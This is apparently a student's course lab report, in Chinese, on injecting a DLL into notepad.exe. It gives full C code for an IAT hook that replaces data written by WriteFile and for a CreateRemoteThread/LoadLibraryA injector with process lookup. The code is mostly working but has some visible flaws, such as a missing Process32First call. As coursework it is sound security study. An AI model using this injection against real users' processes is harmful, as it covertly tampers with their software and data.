# 软件项目安全开发生命周期期末实验 远程DLL注入+APIhook
### 17 软工 葛启明 201711143018
***
## 实验目的：
1、查文档，研究远程线程方式注入dll的实例代码的实现原理。2、运行实例代码，向一个目标程序（比如notepad.exe)注入一个我们自行编写的dll，加载运行。3、整合进程遍历的程序，使得攻击程序可以自己遍历进程得到目标程序的pid。
## 实验思路：
自己编写一个dll,使用APIhook对于目标程序内调用的API进行篡改,根据Taking a Snapshot and Viewing Processes遍历得到目标进程的PID，再使用createRemoteThread将其注入目标程序，实现程序篡改。
## 实验过程：
1. 编写dll代码
``` c
#include <windows.h>
#include <tchar.h>
#include <windows.h>


LONG IATHook(
	__in_opt void* pImageBase,
	__in_opt char* pszImportDllName,
	__in char* pszRoutineName,
	__in void* pFakeRoutine,
	__out HANDLE* phHook
);

LONG UnIATHook(__in HANDLE hHook);

void* GetIATHookOrign(__in HANDLE hHook);

typedef int(__stdcall *LPFN_MessageBoxA)(__in_opt HWND hWnd, __in_opt char* lpText, __in_opt char* lpCaption, __in UINT uType);

typedef int(WINAPI* LPFN_WriteFile)(
	HANDLE       hFile,
	LPCVOID      lpBuffer,
	DWORD        nNumberOfBytesToWrite,
	LPDWORD      lpNumberOfBytesWritten,
	LPOVERLAPPED lpOverlapped
	);

HANDLE g_hHook_WriteFile = NULL;

BOOL WINAPI Fake_WriteFile(
	HANDLE       hFile,
	LPCVOID      lpBuffer,
	DWORD        nNumberOfBytesToWrite,
	LPDWORD      lpNumberOfBytesWritten,
	LPOVERLAPPED lpOverlapped
)
{
	LPFN_WriteFile fnOrigin = (LPFN_WriteFile)GetIATHookOrign(g_hHook_WriteFile);

	return fnOrigin(hFile, "你被黑客入侵啦", nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);
}

void WINAPI hookWriteFile()
{
	do
	{
		IATHook(
			GetModuleHandleW(NULL),
			"Kernel32.dll",
			"WriteFile",
			Fake_WriteFile,
			&g_hHook_WriteFile
		);
	} while (FALSE);
}


BOOL WINAPI DllMain(
	HINSTANCE hinstDLL,  // handle to DLL module
	DWORD fdwReason,     // reason for calling function
	LPVOID lpReserved)  // reserved
{
	// Perform actions based on the reason for calling.
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		// Initialize once for each new process.
		// Return FALSE to fail DLL load.
		hookWriteFile();
		break;

	case DLL_THREAD_ATTACH:
		// Do thread-specific initialization.
		break;

	case DLL_THREAD_DETACH:
		// Do thread-specific cleanup.
		break;

	case DLL_PROCESS_DETACH:
		// Perform any necessary cleanup.
		break;
	}
	return TRUE;  // Successful DLL_PROCESS_ATTACH.
}
```
> IAThook的代码是上课给的示例代码在此处不做展示，上述为编写的dll的代码，通过自己定义的与> > > WriteFile具有相同参数和返回值的FakeWriteFile,使用IAThook进行篡改，修改记事本的行为。
2. getPID and CreatRemoteThread将DLL注入相应程序
``` c
#include <stdio.h>
#include <Windows.h>
#include <tlhelp32.h>
#include "fheaders.h"
#include <stdlib.h>


DWORD t_CreateRemoteThread(const char* strDLLPath, DWORD dwProcessId)
{
	// Calculate the number of bytes needed for the DLL's pathname
	DWORD dwSize = (strlen(strDLLPath) + 1) * sizeof(char);

	// Get process handle passing in the process ID
	HANDLE hProcess = OpenProcess(
		PROCESS_QUERY_INFORMATION |
		PROCESS_CREATE_THREAD |
		PROCESS_VM_OPERATION |
		PROCESS_VM_WRITE,
		FALSE, dwProcessId);
	if (hProcess == NULL)
	{
		printf("[-] Error: Could not open process for PID (%d).\n", dwProcessId);
		return(1);
	}

	// Allocate space in the remote process for the pathname
	LPVOID pszLibFileRemote = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
	if (pszLibFileRemote == NULL)
	{
		printf("[-] Error: Could not allocate memory inside PID (%d).\n", dwProcessId);
		return(1);
	}

	// Copy the DLL's pathname to the remote process address space
	DWORD n = WriteProcessMemory(hProcess, pszLibFileRemote, (LPCVOID)strDLLPath, dwSize, NULL);
	if (n == 0)
	{
		printf("[-] Error: Could not write any bytes into the PID [%d] address space.\n", dwProcessId);
		return(1);
	}



	// Get the real address of LoadLibraryW in Kernel32.dll
	PTHREAD_START_ROUTINE pfnThreadRtn = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle("Kernel32"), "LoadLibraryA");
	if (pfnThreadRtn == NULL)
	{
		printf("[-] Error: Could not find LoadLibraryA function inside kernel32.dll library.\n");
		return(1);
	}

	// Create a remote thread that calls LoadLibraryA(DLLPathname)
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pfnThreadRtn, pszLibFileRemote, 0, NULL);
	if (hThread == NULL)
	{
		printf("[-] Error: Could not create the Remote Thread.\n");
		DWORD err = GetLastError();
		return(1);
	}
	else
		printf("[+] Success: DLL injected via CreateRemoteThread().\n");

	// Wait for the remote thread to terminate
	WaitForSingleObject(hThread, INFINITE);

	// Free the remote memory that contained the DLL's pathname and close Handles
	if (pszLibFileRemote != NULL)
		VirtualFreeEx(hProcess, pszLibFileRemote, 0, MEM_RELEASE);

	if (hThread != NULL)
		CloseHandle(hThread);

	if (hProcess != NULL)
		CloseHandle(hProcess);

	return(0);
}


DWORD GetProcessID(CHAR * processName)
{
	DWORD PID = 0;
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;

	// Take a snapshot of all processes in the system.
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	
	pe32.dwSize = sizeof(PROCESSENTRY32);

	do
	{

		if (strcmp(pe32.szExeFile, processName) == 0) {
			PID = pe32.th32ProcessID;
			break;
		}


	} while (Process32Next(hProcessSnap, &pe32));

	CloseHandle(hProcessSnap);
	return PID;
}




int main() {
	DWORD PID = GetProcessID("notepad.exe");
	printf("%d",PID);
	t_CreateRemoteThread("C:\\Users\\Ming‘s PC\\source\\repos\\FakeSetWindowTextW\\x64\\Debug\\FakeSetWindowTextW.dll", PID);

	system("pause");
	
}
```
通过GetProcessID输入相应进程名，找到其PID，在使用CreateRemoteThread将dll加载到相应内存。
先运行notepad.exe再调用函数注入，此时保存notepad发现保存结果已被篡改。
结果如下图：
<img src='img\1.png'>
<img src='img\2.png'>
<img src='img\3.png'>


## 一点小小的总结
这次本打算做计算器或者dir命令的，在查阅资料后得知调用的API为SetWindowTextW,但是在修改后却始终未出结果，然后思考可能是win10计算器版本的问题，网上也未找到相应解决方案，然后做dir，对FindFirstFile等函数进行篡改发现也未出结果，然后因为自己水平有限，实在不知道该怎么调这种程序注入的bug，就请教同学写了一个对notepad的篡改，因此还需后续的进一步努力来提升自己的水平。


